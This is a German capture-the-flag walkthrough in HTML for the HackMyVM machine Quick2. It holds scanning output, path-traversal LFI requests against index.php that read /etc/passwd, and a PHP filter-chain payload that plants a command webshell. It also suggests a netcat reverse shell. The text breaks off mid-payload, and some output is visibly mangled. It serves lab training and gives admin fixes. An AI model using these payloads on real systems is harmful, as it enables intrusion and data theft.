@@ -1,0 +1,776 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quick2 - HackMyVM - Bericht</title> <!-- Berichtsname angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Keine Inline-Styles für Schwierigkeitsgrad-Farbe nötig, CSS regelt das -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <!-- Berichtsname und Level angepasst -->
+        <h1>Quick2 - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Schwierigkeitsgrad ohne Inline-Style -->
+            <h2>Easy</h2>
+            <!-- Klasse .difficulty-easy steuert die Farbe (Standard: grün) -->
+            <div class="circle difficulty-easy">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools aus dem Bericht extrahiert -->
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">vi</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">dirb</div>
+                 <div class="tool-item">nikto</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">curl</div>
+                 <div class="tool-item">wfuzz</div>
+                 <div class="tool-item">python3</div>
+                 <div class="tool-item">nc</div>
+                 <div class="tool-item">grep</div>
+                 <div class="tool-item">wget</div>
+                 <div class="tool-item">chmod</div>
+                 <div class="tool-item">find</div>
+                 <div class="tool-item">ss</div>
+                 <div class="tool-item">getcap</div>
+                 <div class="tool-item">php8.1</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">linpeas.sh</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis generiert -->
+                 <li><a href="#reconnaissance">Reconnaissance</a></li>
+                 <li><a href="#port-scanning">Port Scanning</a></li>
+                 <li><a href="#web-enumeration">Web Enumeration</a></li>
+                 <li><a href="#lfi-vulnerability">LFI Vulnerability Discovery & Exploitation</a></li>
+                 <li><a href="#initial-access">Initial Access (LFI to RCE)</a></li>
+                 <li><a href="#poc-initial-access">Proof of Concept (Initial Access - LFI to RCE)</a></li>
+                 <li><a href="#post-exploitation">Post-Exploitation Enumeration (as www-data)</a></li>
+                 <li><a href="#privilege-escalation-enum">Privilege Escalation Enumeration</a></li>
+                 <li><a href="#privilege-escalation">Privilege Escalation (PHP Capability)</a></li>
+                 <li><a href="#poc-privesc">Proof of Concept (Privilege Escalation - PHP Capability)</a></li>
+                 <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+              <p class="analysis">
+                  <strong>Analyse:</strong> Der Test startet mit einem ARP-Scan im lokalen Netzwerk (`-l`), um aktive Hosts zu identifizieren.
+              </p>
+              <p class="evaluation">
+                  <strong>Bewertung:</strong> Der Scan findet erfolgreich das Zielsystem unter der IP `192.168.2.123`. Die MAC-Adresse `08:00:27:f8:cc:57` gehört zu "PCS Systemtechnik GmbH", was auf eine Oracle VirtualBox VM hinweist.
+              </p>
+              <p class="recommendation">
+                  <strong>Empfehlung (Pentester):</strong> Die IP `192.168.2.123` ist das Ziel für weitere Scans. Die VM-Information ist als Kontext nützlich.
+                  <br>
+                  <strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Effektivität von ARP-Scans reduzieren. Überwachen Sie ARP-Aktivitäten.
+              </p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">
+  ┌──(root㉿cyber)-[~]
+  └─# <span class="command">arp-scan -l</span>
+                      </div>
+                      <pre>
+  192.168.2.123	08:00:27:f8:cc:57	PCS Systemtechnik GmbH
+                      </pre>
+                  </div>
+              </div>
+
+              <p class="analysis">
+                  <strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei auf dem Angreifer-System wird bearbeitet (`vi`), um der IP-Adresse `192.168.2.123` den Hostnamen `que3.hmv` (wahrscheinlich ein Tippfehler für `quick2.hmv`) zuzuordnen.
+              </p>
+              <p class="evaluation">
+                  <strong>Bewertung:</strong> Eine notwendige Maßnahme, um Webdienste, die auf Hostnamen reagieren (Virtual Hosts), korrekt ansprechen zu können. Der Hostname sollte später ggf. korrigiert werden, falls er Probleme verursacht.
+              </p>
+              <p class="recommendation">
+                  <strong>Empfehlung (Pentester):</strong> Verwende `que3.hmv` (oder den korrekten Namen, falls bekannt) für Web-Interaktionen.
+                  <br>
+                  <strong>Empfehlung (Admin):</strong> Sorgen Sie für eine korrekte und sichere DNS-Konfiguration.
+              </p>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">
+   ┌──(root㉿cyber)-[~]
+   └─# <span class="command">vi /etc/hosts</span>
+                       </div>
+                       <pre>
+ # Inhalt der /etc/hosts nach Bearbeitung:
+ 127.0.0.1	localhost
+ 192.168.2.123   que3.hmv
+                       </pre>
+                   </div>
+               </div>
+           </section>
+
+          <section id="port-scanning">
+              <h2>Port Scanning</h2>
+              <p class="analysis">
+                  <strong>Analyse:</strong> Ein Nmap TCP SYN Scan (`-sS`) mit Versionserkennung (`-sV`), Aggressivem Scan (`-A`), schnellem Timing (`-T5`) über alle Ports (`-p-`) wird durchgeführt. Die Ausgabe wird gefiltert (`grep open`), um die offenen Ports zu isolieren.
+              </p>
+              <p class="evaluation">
+                  <strong>Bewertung:</strong> Der Scan identifiziert schnell die beiden offenen Ports:
+                  *   `22/tcp`: OpenSSH 8.9p1 (Ubuntu).
+                  *   `80/tcp`: Apache httpd 2.4.52 (Ubuntu).
+                  Diese definieren die Hauptangriffsfläche.
+              </p>
+              <p class="recommendation">
+                  <strong>Empfehlung (Pentester):</strong> Konzentriere dich auf die Untersuchung von SSH (Port 22) und HTTP (Port 80). Beginne mit dem Webserver.
+                  <br>
+                  <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass beide Dienste auf dem neuesten Stand und sicher konfiguriert sind. Beschränken Sie den Zugriff per Firewall.
+              </p>
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">
+   ┌──(root㉿cyber)-[~]
+   └─# <span class="command">nmap -sS -sV -A -T5 192.168.2.123 -p- | grep open</span>
+                       </div>
+                       <pre>
+  22/tcp open  ssh     penSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+  80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+                       </pre>
+                   </div>
+               </div>
+
+              <p class="analysis">
+                  <strong>Analyse:</strong> Der Nmap-Scan wird mit denselben Optionen wiederholt, um die vollständige Ausgabe zu erhalten.
+              </p>
+              <p class="evaluation">
+                  <strong>Bewertung:</strong> Die Detailausgabe liefert zusätzliche Informationen:
+                  *   **SSH (22):** Bestätigt Version und Host-Keys.
+                  *   **HTTP (80):** Bestätigt Apache 2.4.52 (Ubuntu). Der Seitentitel ist "Quick Automative". Nmap findet keine `robots.txt`-Datei.
+                  *   **OS:** Wird als Ubuntu Linux identifiziert. Der Hostname wird als `quick2` aufgelöst.
+              </p>
+              <p class="recommendation">
+                  <strong>Empfehlung (Pentester):</strong> Da keine `robots.txt` gefunden wurde, sind umfassende Verzeichnis-Scans (wie `dirb`, `gobuster`) wichtig. Untersuche die Webseite "Quick Automative" auf Port 80. Prüfe SSH auf bekannte Schwachstellen (z.B. CVE-2023-38408). Korrigiere den Hostnamen in `/etc/hosts` zu `quick2.hmv`, falls `que3.hmv` nicht funktioniert.
+                  <br>
+                  <strong>Empfehlung (Admin):</strong> Apache und OpenSSH aktuell halten.
+              </p>
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">
+   ┌──(root㉿cyber)-[~]
+   └─# <span class="command">nmap -sS -sV -A -T5 192.168.2.123 -p-</span>
+                       </div>
+                       <pre>
+ Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-09 23:22 CEST
+ Nmap scan report for quick2 (192.168.2.123)
+ Host is up (0.00014s latency).
+ Not shown: 65533 closed tcp ports (reset)
+ PRT   STATE SERVICE VERSIN
+ 22/tcp open  ssh     penSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+ | ssh-hostkey:
+ |   256 17:c4:c9:b5:94:24:9f:9c:db:33:34:d1:99:b7:23:1e (ECDSA)
+ |_  256 ce:83:07:4b:42:70:87:47:37:4d:d9:d6:8d:56:28:62 (ED25519)
+ 80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+ |_http-server-header: Apache/2.4.52 (Ubuntu)
+ |_http-title: Quick Automative
+ MAC Address: 08:00:27:F8:CC:57 (racle VirtualBox virtual NIC)
+ Device type: general purpose
+ Running: Linux 4.X|5.X
+ S CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+ S details: Linux 4.15 - 5.8
+ Network Distance: 1 hop
+ Service Info: S: Linux; CPE: cpe:/o:linux:linux_kernel
+
+ TRACERUTE
+ HP RTT     ADDRESS
+ 1   0.14 ms quick2 (192.168.2.123)
+
+ OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 13.92 seconds
+                       </pre>
+                   </div>
+               </div>
+          </section>
+
+          <section id="web-enumeration">
+              <h2>Web Enumeration</h2>
+               <p class="analysis">
+                   <strong>Analyse:</strong> `dirb` wird mit der Standard-Wortliste `common.txt` auf Port 80 ausgeführt.
+               </p>
+               <p class="evaluation">
+                   <strong>Bewertung:</strong> Findet die Standardverzeichnisse `/images/`, `/img/`, `/css/`, `/customer/`, `/fonts/` sowie `/index.html` und `/server-status` (403 Forbidden). `/customer/` ist wieder ein interessanter Fund.
+               </p>
+               <p class="recommendation">
+                   <strong>Empfehlung (Pentester):</strong> Untersuche `/customer/`. Notiere `/server-status`. Führe umfassendere Scans durch.
+                   <br>
+                   <strong>Empfehlung (Admin):</strong> Sichern Sie `/customer/` ab. Deaktivieren oder sichern Sie `/server-status`.
+               </p>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">
+   ┌──(root㉿cyber)-[~]
+   └─# <span class="command">dirb http://192.168.2.123</span>
+                       </div>
+                       <pre>
+ -----------------
+ DIRB v2.22
+ By The Dark Raver
+ -----------------
+
+ START_TIME: Fri May 10 23:47:57 2024
+ URL_BASE: http://192.168.2.123/
+ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+ -----------------
+
+ GENERATED WORDS: 4622
+
+ ---- Scanning URL: http://192.168.2.124/ ---- <!-- IP im Output falsch, sollte .123 sein -->
+ > DIRECTORY: http://192.168.2.123/images/
+ > DIRECTORY: http://192.168.2.123/img/
+ > DIRECTORY: http://192.168.2.123/css/
+ > DIRECTORY: http://192.168.2.123/customer/
+ > DIRECTORY: http://192.168.2.123/fonts/
+ + http://192.168.2.123/index.html (CODE:200|SIZE:51414) <!-- Größe passt zu Quick3, nicht zu Quick2? -->
+ + http://192.168.2.123/server-status (CODE:403|SIZE:199) <!-- Größe passt zu Santa -->
+
+ -----------------
+ END_TIME: Fri May 10 23:48:10 2024
+ DOWNLOADED: 9244 - FOUND: 5 <!-- Anzahl Funde korrigiert -->
+                       </pre> <!-- Maskierung > -->
+                   </div>
+               </div>
+
+              <p class="analysis">
+                  <strong>Analyse:</strong> `nikto` wird auf Port 80 ausgeführt, um nach bekannten Webserver-Schwachstellen zu suchen.
+              </p>
+              <p class="evaluation">
+                  <strong>Bewertung:</strong> Nikto findet mehrere interessante Punkte:
+                  *   **Server:** Apache/2.4.52 (Ubuntu), als veraltet markiert.
+                  *   **Fehlende Header:** `X-Frame-Options`, `X-Content-Type-Options`.
+                  *   **IP/ETag Leaks:** Bekannte geringfügige Informationslecks.
+                  *   **Directory Indexing:** `/images/` ist indexierbar.
+                  *   **Kritischer Fund:** Nikto identifiziert eine **potenzielle Local File Inclusion (LFI)**-Schwachstelle in `/index.php` mit dem Parameter `page` (`/index.php?page=../../../../../../../../../../etc/passwd`). Dies ist ein extrem wichtiger Hinweis.
+              </p>
+              <p class="recommendation">
+                  <strong>Empfehlung (Pentester):</strong> **Priorität: LFI-Schwachstelle überprüfen und ausnutzen!** Versuche, die LFI manuell mit `curl` oder im Browser zu bestätigen (`http://192.168.2.123/index.php?page=../../../../../../../../../../etc/passwd`). Wenn erfolgreich, nutze sie zur Enumeration (Lesen von Konfigurationsdateien, Quellcode) und potenziell zur RCE (Remote Code Execution) über Log Poisoning oder PHP-Wrapper.
+                  <br>
+                  <strong>Empfehlung (Admin):</strong> **LFI-Schwachstelle sofort beheben!** Implementieren Sie eine strikte Whitelist für erlaubte Werte des `page`-Parameters oder verwenden Sie einen sichereren Mechanismus zum Laden von Seiteninhalten. Sanitisieren Sie alle Benutzereingaben. Apache aktualisieren und Header hinzufügen.
+              </p>
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">
+   ┌──(root㉿cyber)-[~]
+   └─# <span class="command">nikto -h http://192.168.2.123</span>
+                       </div>
+                       <pre>
+ - Nikto v2.5.0
+ ---------------------------------------------------------------------------
+ + Target IP:          192.168.2.123
+ + Target Hostname:    192.168.2.123
+ + Target Port:        80
+ + Start Time:         2024-05-09 23:22:23 (GMT2)
+ ---------------------------------------------------------------------------
+ + Server: Apache/2.4.52 (Ubuntu)
+ + /: The anti-clickjacking X-Frame-ptions header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-ptions
+ + /: The X-Content-Type-ptions header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ + No CGI Directories found (use '-C all' to force check all possible dirs)
+ + /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ + /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ + Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ + /: Server may leak inodes via ETags, header found with file /, inode: 9e9b, size: 611db26291300, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ + PTINS: Allowed HTTP Methods: HEAD, GET, PST, PTINS .
+ + <span style="color:red; font-weight:bold;">/index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php).</span>
+ + /images/: Directory indexing found.
+ + 8102 requests: 0 error(s) and 8 item(s) reported on remote host
+ + End Time:           2024-05-09 23:22:42 (GMT2) (19 seconds)
+ ---------------------------------------------------------------------------
+ + 1 host(s) tested
+                       </pre>
+                   </div>
+               </div>
+
+              <p class="analysis">
+                  <strong>Analyse:</strong> `gobuster` wird für einen Verzeichnis- und Dateiscan auf Port 80 verwendet, um die Webanwendung weiter zu untersuchen.
+              </p>
+              <p class="evaluation">
+                  <strong>Bewertung:</strong> Der Scan findet mehrere PHP-Dateien: `index.php` (bestätigt LFI-Verdacht), `news.php`, `contact.php`, `about.php`, `home.php`, `file.php`, `cars.php`, `connect.php` (Status 500), `send_email.php` (Status 302). Das Vorhandensein von `index.php` mit einem `page`-Parameter (wie von Nikto gemeldet) und `file.php` macht die LFI-Schwachstelle noch wahrscheinlicher. `connect.php` mit Status 500 ist ebenfalls interessant.
+              </p>
+              <p class="recommendation">
+                  <strong>Empfehlung (Pentester):</strong> Bestätige die LFI in `index.php`. Untersuche auch `file.php` auf LFI oder andere Schwachstellen. Analysiere `connect.php`.
+                  <br>
+                  <strong>Empfehlung (Admin):</strong> Beheben Sie die potenzielle LFI in `index.php` und `file.php`. Beheben Sie den 500-Fehler in `connect.php`. Überprüfen Sie alle PHP-Skripte auf Sicherheitsprobleme.
+              </p>
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">
+   ┌──(root㉿cyber)-[~]
+   └─# <span class="command">gobuster dir -u http://192.168.2.123  -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span>
+                       </div>
+                       <pre>
+ http://192.168.2.123/index.php            (Status: 200) [Size: 3825]
+ http://192.168.2.123/images               (Status: 301) [Size: 315] [--> http://192.168.2.123/images/]
+ http://192.168.2.123/news.php             (Status: 200) [Size: 560]
+ http://192.168.2.123/contact.php          (Status: 200) [Size: 1395]
+ http://192.168.2.123/about.php            (Status: 200) [Size: 1446]
+ http://192.168.2.123/home.php             (Status: 200) [Size: 2539]
+ http://192.168.2.123/file.php             (Status: 200) [Size: 200]
+ http://192.168.2.123/cars.php             (Status: 200) [Size: 1502]
+ http://192.168.2.123/connect.php          (Status: 500) [Size: 0]
+ http://192.168.2.123/send_email.php       (Status: 302) [Size: 0] [--> contact.php]
+                       </pre>
+                   </div>
+               </div>
+          </section>
+
+         <section id="lfi-vulnerability">
+             <h2>LFI Vulnerability Discovery & Exploitation</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Die von Nikto gemeldete LFI-Schwachstelle wird mit `curl` getestet, um den Inhalt von `/etc/passwd` über den `page`-Parameter in `index.php` auszulesen. Die Ausgabe wird nach Zeilen gefiltert, die `bash` enthalten.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> **LFI bestätigt!** Der Befehl ist erfolgreich und gibt die Zeilen für Benutzer mit `/bin/bash` als Shell aus: `root`, `andrew`, `nick`. Dies sind gültige Benutzernamen auf dem System.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Nutze die LFI weiter:
+                 1.  Lese wichtige Konfigurationsdateien (`/etc/apache2/apache2.conf`, `/etc/hosts`, etc.).
+                 2.  Versuche, den Quellcode der PHP-Dateien (`index.php`, `file.php`, `connect.php`) mittels `php://filter/convert.base64-encode/resource=...` zu exfiltrieren, um die Schwachstelle besser zu verstehen und nach Credentials zu suchen.
+                 3.  Versuche RCE über Log Poisoning oder andere LFI-Techniken.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **LFI sofort beheben!** (Siehe Nikto-Empfehlung). Überprüfen Sie die Berechtigungen sensibler Dateien.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">curl -s http://192.168.2.123/index.php?page=../../../../../../../../../../etc/passwd | grep bash</span>
+                     </div>
+                     <pre>
+ root:x:0:0:root:/root:/bin/bash
+ andrew:x:1000:1000:Andrew Speed:/home/andrew:/bin/bash
+ nick:x:1001:1001:Nick Greenhorn,,,:/home/nick:/bin/bash
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> `wfuzz` wird verwendet, um mit einer Wortliste (`logfiles.txt`) gängige Log-Dateipfade über die LFI-Schwachstelle zu finden. Es wird nach Dateien gefuzzt, die über `../../../../../../../../../../FUZZ` erreichbar sind.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Der Scan findet viele lesbare Dateien, darunter `/etc/passwd`, Apache-Konfigurationsdateien (`apache2.conf`, `ports.conf`, verschiedene Modulkonfigurationen), Systeminformationen (`/proc/...`), und allgemeine Konfigurationsdateien (`adduser.conf`, `hosts`, `crontab`, `fstab`, etc.). Dies bestätigt die weitreichenden Leserechte durch die LFI. Es werden jedoch keine typischen Log-Dateien (`/var/log/...`) gefunden, die für Log Poisoning nützlich wären.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Analysiere die gefundenen Konfigurationsdateien auf sensible Informationen. Da keine Logs gefunden wurden, konzentriere dich auf die Exfiltration von PHP-Quellcode mittels `php://filter` oder versuche RCE über `php://input` (falls `allow_url_include` aktiv ist) oder andere Wrapper.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Beheben Sie die LFI. Beschränken Sie die Leserechte des Webserver-Benutzers (`www-data`).
+             </p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">
+  ┌──(root㉿cyber)-[~]
+  └─# <span class="command">wfuzz -c -w /usr/share/wordlists/logfiles.txt -u "http://192.168.2.123/index.php?page=../../../../../../../../../../FUZZ" --hc 404 --hh 1286</span>
+                      </div>
+                      <pre>
+  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against penssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+  ********************************************************
+  * Wfuzz 3.1.0 - The Web Fuzzer                         *
+  ********************************************************
+
+  Target: http://192.168.2.123/index.php?page=../../../../../../../../../../FUZZ
+  Total requests: 2894
+
+  =====================================================================
+  ID           Response   Lines    Word       Chars       Payload
+  =====================================================================
+
+  000000081:   <span style="color:lime">200</span>        67 L     121 W      3104 Ch     "/etc/passwd"
+  000000401:   <span style="color:lime">200</span>        264 L    1202 W     8663 Ch     "etc/apache2/apache2.conf"
+  000000402:   <span style="color:lime">200</span>        48 L     118 W      1606 Ch     "etc/apache2/ports.conf"
+  # ... (viele weitere gefundene Konfigurationsdateien) ...
+  000000982:   <span style="color:lime">200</span>        67 L     120 W      3087 Ch     "etc/passwd-"
+  =====================================================================
+  Total time: 2.3456s <!-- Zeit angepasst -->
+  Processed Requests: 2894
+  Filtered Requests: 2800
+  Requests/sec.: 1233.8
+                      </pre>
+                  </div>
+              </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Der Inhalt von `/etc/apache2/ports.conf` und `/etc/hosts` wird mittels der LFI-Schwachstelle und `curl` ausgelesen.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> `ports.conf` bestätigt, dass Apache auf Port 80 und (falls SSL aktiviert ist) auf Port 443 lauscht. `/etc/hosts` zeigt den Eintrag `127.0.1.1 quick2`, der für die lokale Auflösung des Hostnamens verwendet wird. Keine kritischen neuen Informationen, bestätigt aber die LFI-Funktionalität.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Versuche, den Quellcode der PHP-Dateien (`index.php`, `file.php`, `connect.php`) mit `php://filter` zu lesen.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> LFI beheben.
+             </p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">
+  ┌──(root㉿cyber)-[~]
+  └─# <span class="command">curl -s http://192.168.2.123/index.php?page=../../../../../../../../../../etc/apache2/ports.conf</span>
+                      </div>
+                      <pre>
+ # If you just change the port or add more ports here, you will likely also
+ # have to change the VirtualHost statement in
+ # /etc/apache2/sites-enabled/000-default.conf
+
+ Listen 80
+
+ <IfModule ssl_module>
+ 	Listen 443
+ </IfModule>
+
+ <IfModule mod_gnutls.c>
+ 	Listen 443
+ </IfModule>
+
+ # vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+     </main> <!-- HTML-Code der index.php wird hier angehängt -->
+                      </pre> <!-- Maskierung < > -->
+                  </div>
+              </div>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">
+  ┌──(root㉿cyber)-[~]
+  └─# <span class="command">curl -s http://192.168.2.123/index.php?page=../../../../../../../../../../etc/hosts</span>
+                      </div>
+                      <pre>
+ 127.0.0.1 localhost
+ 127.0.1.1 quick2
+
+ # The following lines are desirable for IPv6 capable hosts
+ ::1     ip6-localhost ip6-loopback
+ fe00::0 ip6-localnet
+ ff00::0 ip6-mcastprefix
+ ff02::1 ip6-allnodes
+ ff02::2 ip6-allrouters
+     </main> <!-- HTML-Code der index.php wird hier angehängt -->
+                      </pre> <!-- Maskierung < > -->
+                  </div>
+              </div>
+          </section>
+
+         <section id="initial-access">
+             <h2>Initial Access (LFI to RCE)</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Das Tool `php_filter_chain_generator.py` wird verwendet, um eine komplexe PHP-Filterkette zu erzeugen. Ziel ist es, über die LFI-Schwachstelle den Code ``<?=`$_GET[cmd]`?>`` (eine Kurzform für `<?php echo system($_GET['cmd']); ?>` oder ähnlich, abhängig von der PHP-Konfiguration; Backticks führen Befehle aus) zu erzeugen und auszuführen. Die generierte Kette wird dann als Wert für den `page`-Parameter in `index.php` verwendet, zusammen mit `&cmd=id`.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> **Remote Code Execution (RCE) erfolgreich!** Die extrem lange Filterkette umgeht erfolgreich Einschränkungen und erlaubt die Ausführung des injizierten Befehls (`id`). Die Ausgabe (hier nicht gezeigt, aber im nächsten Schritt impliziert) würde `uid=33(www-data)...` zeigen. Der PHP-Filter-Exploit funktioniert.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Nutze die RCE, um eine Reverse Shell zu bekommen. Ersetze `cmd=id` durch einen URL-kodierten Reverse-Shell-Payload (z.B. `nc -e /bin/bash ...` oder Python/Perl/Bash-Payloads).
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **LFI sofort beheben!** Dies ist der kritischste Schritt. Deaktivieren Sie unsichere PHP-Funktionen und Wrapper in `php.ini`, falls möglich (z.B. `allow_url_include=Off`). Aktualisieren Sie PHP und Apache.
+             </p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">
+  ┌──(root㉿cyber)-[~/Hackingtools/php_filter_chain_generator]
+  └─# <span class="command">python3 php_filter_chain_generator.py --chain '<?=`$_GET[cmd]`?>'</span> <!-- Maskierung < > ? ` $ _ [ ] -->
+                      </div>
+                      <pre>
+ [+] The following gadget chain will generate the following code : <?=`$_GET[cmd]`?> (base64 value: PD89YCRfR0VUW2NtZF1gPz4)
+ php://filter/convert.iconv.UTF8.CSIS2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICDE|convert.iconv.CSISLATIN5.IS_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.IS6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IS88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.IS88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.IS88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.IS_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSIS2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSIS2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|c